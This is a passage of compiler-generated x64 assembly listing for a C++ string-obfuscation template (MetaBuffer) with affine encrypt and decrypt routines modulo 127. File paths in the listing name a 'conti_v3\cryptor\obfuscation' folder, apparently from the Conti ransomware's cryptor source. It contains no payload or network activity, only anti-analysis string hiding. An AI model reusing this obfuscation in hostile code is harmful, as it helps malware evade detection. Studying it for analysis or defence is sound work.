  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00257	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0025b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv189[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00261	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00268	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0026f	5f		 pop	 rdi
  00270	5d		 pop	 rbp
  00271	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 09	 sub	 eax, 9
  0002d	6b c0 dc	 imul	 eax, eax, -36		; ffffffffffffffdcH
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 43	 imul	 eax, eax, 67		; 00000043H
  0002d	83 c0 09	 add	 eax, 9
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0d	 cmp	 QWORD PTR i$1[rbp], 13
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv189 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
